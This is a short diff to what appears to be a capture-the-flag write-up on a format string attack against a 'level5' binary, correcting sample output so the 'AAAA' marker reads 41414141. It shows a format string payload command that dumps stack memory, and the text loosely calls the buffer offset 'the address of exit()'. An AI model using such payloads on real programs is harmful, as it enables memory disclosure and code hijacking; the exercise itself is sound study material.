@@ -46,9 +46,9 @@ We need to print the memory until we reach the address of `exit()`:
 ```
  python -c 'print "AAAA" + " %x" * 10' > /tmp/payload5
  cat /tmp/payload5 | ./level5
- aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
+ AAAA 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
 ```
-The address of `exit()` is at the 4th position (`61616161`).
+The address of `exit()` is at the 4th position (`41414141`).
 
 
 Our final format string attack:
